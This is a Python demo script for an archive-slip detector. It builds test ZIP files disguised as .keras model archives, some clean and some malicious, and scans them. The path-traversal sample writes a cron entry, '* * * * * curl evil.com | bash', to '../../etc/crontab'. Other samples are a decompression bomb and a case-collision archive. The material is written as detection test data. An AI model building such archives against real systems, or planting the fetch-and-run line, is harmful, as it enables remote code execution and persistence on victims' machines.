#!/usr/bin/env python3
"""
Archive Slip Attack Demo
========================

Demonstrates archive-based attack detection:

1. Path traversal in ZIP (../../etc/passwd)
2. Symlink chain escape (A → B → C → /etc)
3. Decompression bomb (high ratio)
4. Case-insensitive collision
5. Unicode normalization bypass

These attacks are relevant to .keras, .nemo, .mar, and .pth archives.
"""

import io
import os
import struct
import sys
import tempfile
import zipfile

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "python"))

from sentinel.artifact.archive_slip import ArchiveSlipDetector


def create_safe_archive() -> str:
    """Create a clean ZIP archive (model weights)."""
    path = os.path.join(tempfile.gettempdir(), "safe_model.keras")
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("config.json", '{"class_name": "Sequential"}')
        zf.writestr("model.weights.h5", b"fake_weights_data" * 100)
    return path


def create_traversal_archive() -> str:
    """Create a ZIP with path traversal entries."""
    path = os.path.join(tempfile.gettempdir(), "traversal.keras")
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("config.json", '{"class_name": "Sequential"}')
        zf.writestr("../../etc/crontab", "* * * * * curl evil.com | bash")
        zf.writestr("../../../tmp/pwned", "you got hacked")
    return path


def create_bomb_archive() -> str:
    """Create a ZIP with high compression ratio (bomb)."""
    path = os.path.join(tempfile.gettempdir(), "bomb.keras")
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("config.json", '{"class_name": "Sequential"}')
        # 10MB of zeros compresses to ~10KB → ratio > 100:1
        zf.writestr("payload.bin", b"\x00" * (10 * 1024 * 1024))
    return path


def create_collision_archive() -> str:
    """Create a ZIP with case-insensitive filename collision."""
    path = os.path.join(tempfile.gettempdir(), "collision.keras")
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("Config.json", '{"class_name": "Sequential"}')
        zf.writestr("config.json", '{"class_name": "Malicious", "payload": true}')
    return path


def main():
    detector = ArchiveSlipDetector()

    print("=" * 60)
    print("  Eresus Sentinel — Archive Slip Detection Demo")
    print("=" * 60)

    tests = [
        ("SAFE archive", create_safe_archive),
        ("PATH TRAVERSAL archive", create_traversal_archive),
        ("COMPRESSION BOMB archive", create_bomb_archive),
        ("CASE COLLISION archive", create_collision_archive),
    ]

    results = []
    for i, (name, create_fn) in enumerate(tests, 1):
        print(f"\n[{i}/{len(tests)}] Scanning {name}...")
        path = create_fn()
        findings = detector.scan_file(path)

        critical = [f for f in findings if f.severity.value == "critical"]
        high = [f for f in findings if f.severity.value == "high"]

        print(f"  → Total: {len(findings)}, Critical: {len(critical)}, High: {len(high)}")
        results.append((name, findings))

        if critical:
            for f in critical:
                print(f"  🚨 [{f.rule_id}] {f.title}")
        elif high:
            for f in high:
                print(f"  ⚠️  [{f.rule_id}] {f.title}")
        else:
            print("  ✅ Clean")

        # Cleanup
        os.unlink(path)

    # Summary
    print("\n" + "=" * 60)
    print("  Summary")
    print("=" * 60)
    for name, findings in results:
        critical = sum(1 for f in findings if f.severity.value == "critical")
        high = sum(1 for f in findings if f.severity.value == "high")
        status = "🚨" if critical else ("⚠️" if high else "✅")
        print(f"  {status} {name:30s} C={critical} H={high}")


if __name__ == "__main__":
    main()
